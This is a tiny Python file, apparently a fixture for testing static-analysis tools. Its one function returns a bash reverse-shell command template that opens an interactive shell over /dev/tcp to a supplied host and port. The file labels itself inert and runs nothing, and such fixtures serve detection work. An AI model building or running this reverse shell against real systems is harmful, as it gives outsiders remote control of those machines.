# Inert static-analysis fixture. Do not execute.
def build(host, port):
    return "bash -i >& /dev/tcp/{host}/{port} 0>&1"

